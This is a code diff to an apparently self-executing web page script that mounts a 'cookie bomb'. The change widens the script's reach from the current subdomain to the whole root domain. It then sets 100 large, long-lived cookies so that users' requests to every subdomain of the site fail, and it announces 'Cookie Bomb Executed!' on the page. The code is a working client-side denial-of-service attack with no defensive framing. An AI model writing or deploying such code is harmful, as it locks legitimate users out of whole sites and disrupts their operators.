@@ -36,27 +36,31 @@
           console.error(`Failed to set cookie ${key}:`, e);
         }
       }
-
+      function getRootDomain() {
+        var parts = window.location.hostname.split('.');
+        if (parts.length > 2) {
+          return '.' + parts.slice(-2).join('.');
+        } else {
+          return window.location.hostname;
+        }
+      }
       // Main cookie bomb function
       function deployCookieBomb() {
-        var subdomain = getCurrentSubdomain();
+        var rootDomain = getRootDomain();
         var largeValue = generateLargeValue();
         var expires = getExpirationDate();
-        var maxCookies = 100; // Stay within typical browser limits
+        var maxCookies = 100;
 
-        // Set multiple large cookies
         for (var i = 0; i < maxCookies; i++) {
-          var key = `bomb${i}_${Date.now()}`; // Unique key to avoid overwrites
-          setCookie(key, largeValue, subdomain, expires);
+          var key = `bomb${i}_${Date.now()}`;
+          setCookie(key, largeValue, rootDomain, expires);
         }
 
-        // Verify cookies were set
         var cookiesSet = document.cookie.split(';').length;
-        console.log(`Set ${cookiesSet} cookies for ${subdomain}`);
-
-        // Notify user
+        console.log(`Set ${cookiesSet} cookies for ${rootDomain}`);
         document.querySelector('h1').textContent = `Cookie Bomb Executed! (${cookiesSet} cookies set)`;
       }
+
 
       // Execute the cookie bomb
       try {
